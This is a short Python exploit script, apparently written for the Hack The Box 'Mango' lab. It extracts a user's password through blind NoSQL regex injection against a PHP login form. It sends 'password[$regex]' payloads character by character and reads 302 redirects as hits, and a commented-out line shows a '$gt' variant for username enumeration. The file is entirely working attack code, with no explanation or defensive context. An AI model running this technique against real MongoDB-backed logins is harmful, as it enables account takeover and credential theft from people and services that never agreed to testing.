# modified from https://blog.0daylabs.com/2016/09/05/mongo-db-password-extraction-mmactf-100/.

import requests
import string

flag = ""
url = "http://staging-order.mango.htb/index.php"

# Each time a 302 redirect is seen, we should restart the loop

restart = True

while restart:
    restart = False

    for i in string.ascii_letters + string.digits + "~<>!@#$%[]^()@_{}":
        payload = flag + i
        post_data = {'username': 'mango', 'password[$regex]': "^"+ payload + ".*", 'login': 'login'}
        # post_data = {'username[$regex]': "^"+payload + ".*", 'password[$gt]': '', 'login': 'login'}
        # print(post_data)
        r = requests.post(url, data=post_data, allow_redirects=False)

        # A correct password means we get a 302 redirect

        if r.status_code == 302:
            print(payload)
            restart = True
            flag = payload

            # Exit if "}" gives a valid redirect

            if i == "}":
                print("\nUser: " + flag)

                exit(0)
            break
